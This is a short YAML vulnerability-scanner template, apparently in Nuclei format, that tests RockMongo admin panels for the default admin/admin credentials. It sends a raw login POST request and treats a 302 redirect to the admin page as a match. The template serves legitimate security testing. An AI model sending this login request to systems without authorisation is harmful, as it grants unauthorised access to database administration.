id: poc-yaml-rockmongo-default-password
info:
  name: Rockmongo Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    This template checks for default credentials in Rockmongo by attempting to log in with default username and password.

http:
  - raw:
      - |
        POST /index.php?action=login.index&host=0 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "Location"
          - "/index.php?action=admin.index&host=0"
